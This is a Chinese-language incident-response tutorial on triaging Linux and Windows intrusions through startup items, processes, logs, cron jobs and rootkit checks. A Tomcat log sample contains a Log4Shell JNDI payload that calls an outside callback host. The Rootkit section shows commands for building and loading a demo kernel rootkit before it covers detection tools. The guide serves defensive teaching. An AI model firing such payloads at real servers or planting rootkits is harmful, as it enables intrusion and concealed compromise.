# Linux 入门篇



<iframe src="//player.bilibili.com/player.html?aid=814678819&amp;bvid=BV1FG4y1Y7UQ&amp;cid=809811995&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="700px" height="472px"></iframe>

应急响应指遇到重大或突发事件后所采取的措施和行动。应急响应所处置的突发事件不仅仅包括硬件、产品、网络、配置等方面的故障，也包括各类安全事件，如：黑客攻击、木马病毒、勒索病毒、Web攻击等。

**处置手段**

发现问题要处置，遵循原则：`百分百确认是非法文件，报备记录关停，摸棱两可找负责人确认，处置看沟通结果`

***注意：**linux版本之间有差异，具体以自己的系统版本为准

## [开机启动项](#开机启动项)

**环境信息：**

- Ubuntu 20.04.4 LTS
- XShell

伴随开机启动，一般生产服务器很少重启，但是为防止被控机器失联部分木马会添加开机启动项作为复活手段。

### [/etc/rc.local](#etcrclocal)

```bash
#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Ensure that the script will "exit 0" on success or any other
# value on error.
#
# To enable or disable this script, just change the execution
# bits.
#
# By default, this script does nothing.

touch /root/1.txt
```

### [/etc/rc.d/rc.local](#etcrcdrclocal)

```bash
#!/bin/bash
# THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES
#
# It is highly advisable to create own systemd services or udev rules
# to run scripts during boot instead of using this file.
#
# In contrast to previous versions due to parallel execution during boot
# this script will NOT be run after all other services.
#
# Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure
# that this script will be executed during boot.

touch /var/lock/subsys/local
touch /tmp/1.txt
```

### [/etc/rc.d/init.d/](#etcrcdinitd)

这个目录下面放了可执行脚本或文件

### [/etc/rc*.d/](#etcrcd)

```
rc0.d/ rc1.d/ rc2.d/ rc3.d/ rc4.d/ rc5.d/ rc6.d/ rcS.d/
```

### [systemctl list-unit-files](#systemctl-list-unit-files)

```
...
ssh.service                            enabled         enabled      
ssh@.service                           static          enabled      
sshd.service                           enabled         enabled      
sudo.service                           masked          enabled      
syslog.service                         enabled         enabled      
system-update-cleanup.service          static          enabled      
systemd-ask-password-console.service   static          enabled      
systemd-ask-password-plymouth.service  static          enabled      
systemd-ask-password-wall.service      static          enabled      
systemd-backlight@.service             static          enabled   
...
```

发现恶意服务，使用下面命令关停（以关闭`ufw.service`服务作为实例）：

```bash
sudo systemctl stop ufw.service # 停止服务
sudo systemctl disable ufw.service # 删除开启启动
```

关错了，避免尴尬偷偷启动服务

```bash
sudo systemctl start ufw.service # 启动服务
sudo systemctl enable ufw.service # 添加开启启动
```

## [资源占用](#资源占用)

**环境信息：**

- Ubuntu 20.04.4 LTS
- XShell

<iframe src="//player.bilibili.com/player.html?aid=217356590&amp;cid=811372793&amp;bvid=BV1na411G7YH" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="700px" height="472px" style="color: rgb(0, 0, 0); font-family: &quot;Microsoft YaHei&quot;; font-size: medium; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"></iframe>



进程是Linux当前正在处理的任务，当运行某个软件时将为其创建一个进程。

```
vulab@sechelper:~$ sudo ps -efcaux # 查看所有进程
...
www-data   97735  0.0  1.8 309560 65456 ?        S    Aug20   0:13  \_ php-fpm7.4
syslog       785  0.0  0.1 224492  5528 ?        Ssl  Aug17   0:03 rsyslogd
ntp          796  0.0  0.1  74632  4240 ?        Ssl  Aug17   0:13 ntpd
root         802  0.0  0.2  17176  8044 ?        Ss   Aug17   0:03 systemd-logind
root         816  0.0  0.2  12172  7436 ?        Ss   Aug17   0:04 sshd
root      126262  0.0  0.2  13920  8852 ?        Ss   15:47   0:00  \_ sshd
ubuntu    126363  0.0  0.1  14052  6260 ?        S    15:47   0:00      \_ sshd
ubuntu    126364  0.0  0.1   8276  5216 pts/0    Ss   15:47   0:00          \_ bash
root      130670  0.0  0.1   9404  4752 pts/0    S    18:59   0:00              \_ sudo
root      130671  0.0  0.1   8260  4252 pts/0    S    18:59   0:00                  \_ su
root      130672  0.0  0.1   7236  4056 pts/0    S    18:59   0:00                      \_ bash
...
```

查找进程文件位置

```bash
# lsof 显示指定进程打开的所有文件列表
vulab@sechelper:~$ sudo lsof -p 948 # 查看pid为948的进程详细信息
COMMAND PID USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME
dockerd 948 root  cwd       DIR                8,2     4096          2 /
dockerd 948 root  rtd       DIR                8,2     4096          2 /
dockerd 948 root  txt       REG                8,2 95757512    2883867 /usr/bin/dockerd
dockerd 948 root  mem-W     REG                8,2    32768    2231986 /var/lib/docker/buildkit/cache.db
vulab@sechelper:~$ sudo ls -al /proc/948/exe # 查看pid为948的进程文件绝对路径
lrwxrwxrwx 1 root root 0 Aug 21 03:24 /proc/948/exe -> /usr/bin/dockerd
```

| 文件    | 作用                                           |
| ------- | ---------------------------------------------- |
| cwd     | 符号链接（类似快捷方式）的是进程运行目录       |
| exe     | 符号链接（类似快捷方式）的是执行程序的绝对路径 |
| cmdline | 符号链接（类似快捷方式）的是进程运行目录       |
| environ | 记录进程运行时系统的环境变量                   |

表1 进程符号链接参考

**CPU**

CPU也称为中央处理器、主处理器或单处理器，是执行计算机指令得关键部件，某服务器突然有一个进程占用的CPU远超平时，那么可能被植入了挖矿病毒。

> 排查话术：CPU是否远超平时居高不下，如果是的话那么可能被植入了挖矿病毒。

```text
vulab@sechelper:~$ top # 排名越靠前占用的CPU越多
```

![Snipaste_2022-12-06_09-57-06](F:/%255CTemp%255Cresources%255Cd9c99c4d45882e318d405236aa08d48e.png)

图2 top命令结果

```
vulab@sechelper:~$ ps -aux| sort -k3nr | head -10
root       12039  122  3.4 3554048 139720 ?      Sl   08:18   0:02 /usr/local/jdk-17.0.3.1/bin/java -Djava.util.logging.config.file=/usr/local/apache-tomcat-10.0.22/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/apache-tomcat-10.0.22/bin/bootstrap.jar:/usr/local/apache-tomcat-10.0.22/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/apache-tomcat-10.0.22 -Dcatalina.home=/usr/local/apache-tomcat-10.0.22 -Djava.io.tmpdir=/usr/local/apache-tomcat-10.0.22/temp org.apache.catalina.startup.Bootstrap start
...
```

**内存**

程序启动时会被系统读入内存，在执行的过程也不断的在内存中申请新的空间。

> 排查话术：最近内存是否突然升高持续不下，如果是的话那么可能被植入了挖矿病毒。

```text
vulab@sechelper:~$  ps -aux | sort -k4nr | head -10 # 内存占用最高的是个进程
root         948  0.0  1.9 1308116 78424 ?       Ssl  03:24   0:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root         859  0.0  1.2 1355640 51364 ?       Ssl  03:24   0:14 /usr/bin/containerd
root         851  0.0  1.0 874552 42960 ?        Ssl  03:24   0:01 /usr/lib/snapd/snapd
root         890  0.0  0.5 107916 20864 ?        Ssl  03:24   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
...
```

**网络带宽**

带宽也就是网速的最高上限，比如家里的100/M带宽，就是每秒100M的传输速度，带宽分为上行和下行对应着上传下载，某服务器上行流量比往常高出几倍时，说明在外发大量的数据重点检查是否为正常业务。

> 排查话术：网络流量上下行有异常吗？有异常的话是哪个IP？

网络占用需要安装软件辅助，应急时大部分情况都不允许随意安装软件，这时候就需要和运维的网络沟通，从设备上看下流量情况。

```
vulab@sechelper:~$ sudo apt-get install iftop # centos使用 yum install iftop
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following NEW packages will be installed:
  iftop
0 upgraded, 1 newly installed, 0 to remove and 54 not upgraded.
Need to get 36.3 kB of archives.
After this operation, 95.2 kB of additional disk space will be used.
Get:1 http://cn.archive.ubuntu.com/ubuntu focal/universe amd64 iftop amd64 1.0~pre4-6build1 [36.3 kB]
Fetched 36.3 kB in 1s (24.6 kB/s)
Selecting previously unselected package iftop.
(Reading database ... 108839 files and directories currently installed.)
Preparing to unpack .../iftop_1.0~pre4-6build1_amd64.deb ...
Unpacking iftop (1.0~pre4-6build1) ...
Setting up iftop (1.0~pre4-6build1) ...
Processing triggers for man-db (2.9.1-1) ...
```

使用`iftop`命令分析网络时，需要指定网卡，一个生产机器服务器会有很多块网卡，有管理用的、业务用的或其它的，这时候要与运维沟通区分各个网卡的用途。

```
vulab@sechelper:~$ ip addr # ifconfig 查看所有网卡
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:23:3d:42 brd ff:ff:ff:ff:ff:ff
    inet 192.168.111.133/24 brd 192.168.111.255 scope global dynamic ens33
       valid_lft 941sec preferred_lft 941sec
    inet6 fe80::20c:29ff:fe23:3d42/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:76:f7:a7:4b brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-d9f18b6d603d: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:8b:93:c0:83 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-d9f18b6d603d
       valid_lft forever preferred_lft forever
    inet6 fe80::42:8bff:fe93:c083/64 scope link 
       valid_lft forever preferred_lft forever
10: veth6a9efeb@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-d9f18b6d603d state UP group default 
    link/ether 76:0d:b7:6b:56:10 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::740d:b7ff:fe6b:5610/64 scope link 
       valid_lft forever preferred_lft forever
vulab@sechelper:~$ sudo iftop -i ens33 -P # 指定ens33网卡，分析其流量
```

图3 iftop流量分析

**网络连接** 服务器每发出和接收一个TCP/UDP请求都能看到连接（短时间内）。

netstat 命令：

- -a 显示所有
- -n 数字形式展示连接端口
- -t 仅查看TCP连接情况
- -u 仅查看UDP连接情况
- -p 显示相关程序名

```
vulab@sechelper:~$ sudo netstat -antup # 我经常使用的一条命令，查看所有连接
roto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:60801         0.0.0.0:*               LISTEN      1212/apache2        
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1066/mysqld         
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1/init              
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1502/nginx: master  
tcp        0      0 10.0.4.16:53            0.0.0.0:*               LISTEN      771/named     
tcp        0      0 10.0.4.16:80            93.157.63.28:10959      SYN_RECV    -                   
tcp        0      0 10.0.4.16:35322         169.254.0.55:5574       ESTABLISHED 1316/YDService      
tcp        0      0 10.0.4.16:41805         192.112.36.4:53         TIME_WAIT   -                   
tcp        0      0 10.0.4.16:35978         169.254.0.138:8186      ESTABLISHED 58593/tat_agent     
tcp6       0      0 127.0.0.1:60800         :::*                    LISTEN      1580/java           
tcp6       0      0 :::111                  :::*                    LISTEN      1/init      
... 
```

| 状态        | 作用                                             |
| ----------- | ------------------------------------------------ |
| LISTEN      | 监听TCP端口，等待远程连接                        |
| TIME-WAIT   | 等待一段时间确保远程TCP中断请求                  |
| ESTABLISHED | 打开着的连接                                     |
| SYN_RECV    | 接收和发送连接请求后等待确认连接请求确认的情况。 |
| CLOSING     | 等待远程TCP对连接中断的确认                      |
| CLOSE       | 连接完全关闭                                     |

表2 端口状态对照表

**关闭进程**

这里注意一下，关停服务后进程是否会”复活“，如果恶意进程被`kill`后重新启动，那么肯定有其它地方有自启动方法，继续排查守护进程、定时任务、系统配置、服务和系统文件。

```
vulab@sechelper:~$ sudo kill -9 1434
```

## [环境变量](#环境变量)

**环境信息：**

- Ubuntu 20.04.4 LTS
- XShell

<iframe src="//player.bilibili.com/player.html?aid=344818165&amp;cid=811364156&amp;bvid=BV1ud4y1A7jE&amp;ts=55385854" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="700px" height="472px" style="color: rgb(0, 0, 0); font-family: &quot;Microsoft YaHei&quot;; font-size: medium; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"></iframe>



```
/etc/profile
/etc/bashrc
/etc/bash.bashrc 
~/.bashrc
~/.profile 
~/.bash_profile
```

这些文件用于设置系环境变量或启动程序，每次Linux登入或切换用户都会触发这些文件。

![linux执行顺序](F:/%255CTemp%255Cpath%255C562b478e779399ff1f9e5d2df17fff5e.png)

图1 Linux登入环境环境变量触发顺序

切换用户时也会触发环境变量文件

```bash
vulab@sechelper:~$ sudo su
```

### [~/.bash_logout](#bash_logout)

登出账户时触发。

```
vulab@sechelper:~$ exit
logout
~/.bash_logout
```

## [中间件日志](#中间件日志)

中间件是介于应用系统和系统软件之间的一类软件，它使用系统软件所提供的基础服务（功能），衔接网络上应用系统的各个部分或不同的应用，能够达到资源共享、功能共享的目的。

### [nginx](#nginx)

```
220.181.108.159 - - [01/Dec/2022:15:10:15 +0800] "GET / HTTP/1.1" 403 134 "-" "Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
```

### [apache](#apache)

```
192.168.111.1 - - [01/Dec/2022:07:20:05 +0000] "GET /admin.php HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
```

### [tomcat](#tomcat)

```
192.168.111.1 - - [01/Dec/2022:08:28:25 +0000] "GET /admin.jsp$%7Bjndi:ldap://2lnhn2.ceye.io%7D HTTP/1.1" 404 767
```

### [分析维度：](#分析维度)

- 时间范围内IP访问量
- 时间范围内对某个页面的IP访问量
- 时间范围内IP访问错误数
- 关键字搜索

### [参考：](#参考)

- [运维必备技能 WEB 日志分析](https://cloud.tencent.com/developer/article/1051427)

## [系统日志](#系统日志)

日志文件是记录l系统运行信息的文件，Linux系统内记载很多不同类型的日志，例如：

- Linux内核消息
- 登入事件
- 程序错误日志
- 软件安装信息

以上日志内记录系统内一些关键的信息，通过这些日志内记录的信息，可以帮助安全人员寻找到攻击者蛛丝马迹。作者整理了以下常见日志信息：

`/var/log/dmesg` 内核的一些信息。

`/var/log/auth.log` 此文件中包含系统授权信息，以及用户登录和使用的身份验证机制。

`/var/log/boot.log` 包含系统启动时记录的信息

`/var/log/daemon.log` 正在运行的各种系统后台守护程序将信息记录到此文件中。

`/var/log/kern.log` 包含内核记录的信息。有助于解决定制内核的故障。

`/var/log/lastlog` 显示所有用户的最近登录信息。这不是`ascii`文件。管理员可以使用`lastlog`命令查看此文件的内容。

`/var/log/maillog`和`/var/log/mail.log` 记录系统上运行的邮件服务器的信息。例如，`sendmail`将有关所有已发送项目的信息记录到此文件中。

`/var/log/user.log` 包含有关所有用户级日志的信息。

`/var/log/Xorg.x.log` 将来自x服务器的消息记录到此文件。

`/var/log/btmp` 此文件包含有关失败登录尝试的信息。使用最后一个命令查看btmp文件。例如，last-f/var/log/btmp|more。

`/var/log/yum.log` 包含使用yum安装包时记录的信息。在删除具有依赖项的包时，可以引用此文件。

`/var/log/cron` 每当cron守护程序（或anacron）启动cron作业时，它都会将有关cron作业的信息记录在该文件中

`/var/log/secure` 包含与身份验证和授权权限相关的信息。例如，sshd在这里记录所有消息，包括登录失败。

`/var/log/wtmp-wtmp` 文件记录所有登录和注销。

`/var/log/utmp-utmp` 文件允许您发现有关当前使用系统的用户的信息。

`/var/log/faillog` 包含失败的用户登录尝试。使用faillog命令显示此文件的内容。

`/var/log/httpd/` 包含apacheweb服务器access_log和error_log以及相关的虚拟主机日志（如果设置为在此处记录）。

`/var/log/apache2` 包含apache web服务器access_log和error_log以及相关的虚拟主机日志（如果设置为在此处记录）。

`/var/log/conman/-conman` 客户端的日志文件。conman连接由conmand守护进程管理的远程控制台。

`/var/log/mail/` 此子目录包含来自邮件服务器的其他日志。例如，sendmail将收集的邮件统计信息存储在/var/log/mail/statistics文件中

`/var/log/audit/` 包含由Linux审核守护程序（auditd）存储的日志信息。

`/var/log/settroubleshoot/` SELinux使用settroublishootd（SE TroubleshootDaemon）来通知文件安全上下文中的问题，并将这些信息记录在此日志文件中。

`/var/log/samba/` 包含samba存储的日志信息，用于将Windows连接到Linux。

`/var/log/sa/` 包含sysstat包收集的每日sar文件。

以上的每个文件都给大家演示一遍不太可能，这里重点是交给大家思路。如下案例：

### [登入验证日志](#登入验证日志)

1. 不知道日志的每一行是做什么的，去搜索
2. 既然是登入验证肯定会有成功和失败，那么什么状态是成功或失败
3. 除成功失败外是不是包含其它信息，如：用户名、登入来源IP地址

经过以上的几点思考，我在网上找到文章和命令

**登入失败次数**

```bash
vulab@sechelper:/var/log$ sudo grep "Failed password" auth.log | wc -l
```

**登入成功**

```bash
vulab@sechelper:/var/log$ sudo grep "password" auth.log | grep -v Failed | grep -v Invalid
```

**统计攻击者IP个数**

```shell
vulab@sechelper:/var/log$ sudo awk '{if($6=="Failed"&&$7=="password"){if($9=="invalid"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(ip in ips){print ip, ips[ip]}}' auth.* | wc -l
```

**攻击次数排列，由高到低**

```bash
vulab@sechelper:/var/log$ sudo awk '{if($6=="Failed"&&$7=="password"){if($9=="invalid"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(ip in ips){print ip, ips[ip]}}' auth.* | sort -k2 -rn | head
41.214.134.201 18358
189.217.194.155 9994
218.39.177.111 4713
120.48.13.143 2179
36.138.66.177 1448
139.162.114.41 861
104.248.94.181 756
188.166.57.168 431
141.94.110.90 347
23.224.143.15 307
```

### [参考](#参考)

- https://www.loggly.com/ultimate-guide/linux-logging-basics/
- [查找 ssh 暴力攻击：使用 awk、grep 等命令简单分析服务器](https://segmentfault.com/a/1190000021752790)

## [Rootkit](#rootkit)

<iframe src="//player.bilibili.com/player.html?aid=514880890&amp;cid=815501462&amp;bvid=BV1ug411D74D" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="700px" height="472px" style="color: rgb(0, 0, 0); font-family: &quot;Microsoft YaHei&quot;; font-size: medium; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"></iframe>



Rootkit是指其主要功能为：隐藏其他程序进程的软件，可能是一个或一个以上的软件组合。在今天，Rootkit一词更多地是指被作为驱动程序，加载到操作系统内核中的恶意软件。

![rootkit](F:/%255CTemp%255Crootkit%255Ccd517fdfe7a0ef7ef7fd9d821054c0c0.png)

图4 rootkit原理图

```bash
vulab@sechelper:~/1337kit$ sudo python3 builder.py --config config.yml  # 编译rootkit
[sudo] password for vulab: 

 ████   ████████   ████████  ██████████ █████       ███   █████
░░███  ███░░░░███ ███░░░░███░███░░░░███░░███       ░░░   ░░███
 ░███ ░░░    ░███░░░    ░███░░░    ███  ░███ █████ ████  ███████
 ░███    ██████░    ██████░       ███   ░███░░███ ░░███ ░░░███░
 ░███   ░░░░░░███  ░░░░░░███     ███    ░██████░   ░███   ░███
 ░███  ███   ░███ ███   ░███    ███     ░███░░███  ░███   ░███ ███
 █████░░████████ ░░████████    ███      ████ █████ █████  ░░█████
░░░░░  ░░░░░░░░   ░░░░░░░░    ░░░      ░░░░ ░░░░░ ░░░░░    ░░░░░
LKM Rootkit Builder
...
  LD [M]  /tmp/ItclNzX3O3hJUXQ3/project.ko
make[1]: Leaving directory '/usr/src/linux-headers-5.4.0-109-generic'

=== File /home/vulab/1337kit/project.ko created ===

vulab@sechelper:~/1337kit$ sudo insmod project.ko # 将rootkit安装到内核
vulab@sechelper:~/1337kit$ sudo lsmod # 查看内核模块
vulab@sechelper:~/1337kit$ sudo rmmod project # 卸载内核模块
```

**检查系统是否被植入rootkit**

```text
vulab@sechelper:~$ sudo apt install chkrootkit # 安装chkrootkit
vulab@sechelper:~$ sudo chkrootkit
[sudo] password for vulab: 
ROOTDIR is `/'
Checking `amd'...                                           not found
Checking `basename'...                                      not infected
Checking `biff'...                                          not found
Checking `chfn'...                                          not infected
Checking `chsh'...                                          not infected
Checking `cron'...                                          not infected
...
Searching for suspect PHP files...                          nothing found
Searching for anomalies in shell history files...           nothing found
Checking `asp'...                                           not infected
Checking `bindshell'...                                     not infected
Checking `lkm'...                                           chkproc: nothing detected
chkdirs: nothing detected
Checking `rexedcs'...                                       not found
Checking `sniffer'...                                       lo: not promisc and no packet ...
Checking `w55808'...                                        not infected
Checking `wted'...                                          chkwtmp: nothing deleted
Checking `scalper'...                                       not infected
Checking `slapper'...                                       not infected
Checking `z2'...                                            chklastlog: nothing deleted
Checking `chkutmp'...                                       chkutmp: nothing deleted
Checking `OSX_RSPLUG'...                                    not tested
sudo apt install rkhunter # 安装rkhunter
```

![rkhunter](F:/%255CTemp%255Crootkit%255C5190c5de652348cfcdd6c78c9aeae824.png)

图5 rhkhunter 配置

```
vulab@sechelper:~$ sudo rkhunter --check
[ Rootkit Hunter version 1.4.6 ]

Checking system commands...

  Performing 'strings' command checks
    Checking 'strings' command                               [ OK ]

  Performing 'shared libraries' checks
    Checking for preloading variables                        [ None found ]
    Checking for preloaded libraries                         [ None found ]
    Checking LD_LIBRARY_PATH variable                        [ Not found ]

...
```

**隐藏的rootkit如何删除**

Rootkit在内核模块里找不到，那么就存在删除不掉的可能，这时候需要将感染系统以文件挂载到其它Linux系统上，进行清除操作。

参考：

- [rkhunter 官网](http://rkhunter.sourceforge.net/)
- [chkrootkit 官网](http://www.chkrootkit.org/)
- [rootkit demo](https://github.com/lukasbalazik123/1337kit)

## [定时任务](#定时任务)

<iframe src="//player.bilibili.com/player.html?aid=557432593&amp;cid=814421630&amp;bvid=BV1ne4y1Z7T9" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="700px" height="472px" style="color: rgb(0, 0, 0); font-family: &quot;Microsoft YaHei&quot;; font-size: medium; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"></iframe>



定时定点执行Linux程序或脚本。

## [crontab](#crontab)

定时任务计划命令，下面几个是创建任务后保存的路径。

- /var/spool/cron/ 目录里的任务以用户命名
- /etc/crontab 调度管理维护任务
- /etc/cron.d/ 这个目录用来存放任何要执行的crontab文件或脚本。
- 下面这些都是检查重点对象
  - /etc/cron.hourly/ 每小时执行一次
  - /etc/cron.daily/ 每天执行一次
  - /etc/cron.weekly/ 每周执行一次
  - /etc/cron.monthly/ 每月执行一次

*扩展知识：*

`/etc/cron.allow `存放可创建定时任务账户，一行一个账户名，已创建的定时任务不受影响

```
vulab@sechelper:~$sudo cat /etc/cron.allow
root
vulab@sechelper:~$ crontab -e
You (vulab) are not allowed to use this program (crontab)
See crontab(1) for more information
```

`/etc/cron.deny `存放不可创建定时任务账户，一行一个账户名，已创建的定时任务不受影响

```
vulab@sechelper:~$ crontab -e
You (vulab) are not allowed to use this program (crontab)
See crontab(1) for more information
```

参考：

- [定时任务](https://www.runoob.com/w3cnote/linux-crontab-tasks.html)

## [威胁情报](#威胁情报)

<iframe src="//player.bilibili.com/player.html?aid=602345518&amp;cid=812414069&amp;bvid=BV1LB4y157VT" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="700px" height="472px" style="color: rgb(0, 0, 0); font-family: &quot;Microsoft YaHei&quot;; font-size: medium; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"></iframe>



威胁情报是识别和分析网络威胁的过程。威胁情报平台可以查出一些域名和IP地址得`信誉`度，一旦发现它们存在网络攻击痕迹迅速封禁。

- [微步在线](https://x.threatbook.com/)
- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [安恒威胁分析平台](https://ti.dbappsecurity.com.cn/)
- [深信服威胁情报中心](https://ti.sangfor.com.cn/analysis-platform)
- [VenusEye威胁情报中心](https://www.venuseye.com.cn/)
- [360威胁情报中心](https://ti.360.cn/#/homepage)
- [Data Mining for Threat Intelligence](https://www.threatminer.org/)

# Windows 入门篇

## [Windows系统入侵排查](#windows系统入侵排查)

当发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施。

常见的应急相应事件分类：

Web入侵：页面挂马、Webshell、主页篡改

系统入侵：病毒木马、勒索软件、远程后门

网络攻击：DDOS攻击、DNS劫持、ARP欺骗

针对常见的攻击事件，结合应急响应事件分析和解决的方法，总结Window服务器入侵排查的思路

### [自动化查杀](#自动化查杀)

- 病毒查杀
  - 检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。
- webshell查杀
  - 检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。

### [日志分析](#日志分析)

系统日志

- 分析方法：

  a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。

  b、Win+R 打开运行，输入 "eventvwr.msc"，回车运行，打开"事件查看器"。

  C、导出应用程序日志、安全日志、系统日志，利用 [Log Parser](https://www.microsoft.com/en-us/download/details.aspx?id=24659) 进行分析。

Web 访问日志

- 分析方法：

  a、找到中间件的web日志，打包到本地方便进行分析。

  b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。

## [异常资源](#异常资源)

### [端口](#端口)

检查端口连接情况，是否有远程连接、可疑连接。

### [检查方法](#检查方法)

1. 使用`netstat -ano` 命令查看目前的网络连接，定位可疑的 ESTABLISHED
2. 根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 `tasklist | findstr "PID"`

![68040354217](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/affd7128371b1cd565e7b5dc9d314dd0.png)

![68040370627](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/28b3c042c105e39d47e9652445fb5a6f.png)

### [进程](#进程)

- 开始 -- 运行 -- 输入 `msinfo32` 命令，依次点击 "软件环境 -- 正在运行任务" 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。
- 打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。
- 通过微软官方提供的 Process Explorer 等工具进行排查 。
- 查看可疑的进程及其子进程。可以通过观察以下内容：
  - 没有签名验证信息的进程
  - 没有描述信息的进程
  - 进程的属主
  - 进程的路径是否合法
  - CPU 或内存资源占用长时间过高的进程

**小技巧：**

- 查看端口对应的 PID：`netstat -ano | findstr "port"`
- 查看进程对应的 PID：任务管理器 -- 查看 -- 选择列 -- PID 或者 `tasklist | findstr "PID"`
- 查看进程对应的程序位置：
  - 任务管理器 -- 选择对应进程 -- 右键打开文件位置
  - 运行输入 `wmic`，cmd 界面输入 `process```
- `tasklist /svc` 进程 -- PID -- 服务
- 查看Windows服务所对应的端口：`%systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\Windows 路径）`

![68040398823](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/ae7f6e8bf016a24d657bb7929e3119c1.png)

![68040404291](%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-spider.assets/cf09d7b25174beb1eaf7b16a7a57da74.png)

## [系统信息](#系统信息)

1、查看系统版本以及补丁信息

- 检查方法：单击【开始】>【运行】，输入 `systeminfo`，查看系统信息。

2、查找可疑目录及文件

- 检查方法：

  a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。

  ```
  Window 2003版本 C:\Documents and Settings
  Window 2008R2及以后版本 C:\Users\
  ```

  b、单击【开始】>【运行】，输入 `%UserProfile%\Recent`，分析最近打开分析可疑文件。

  c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。

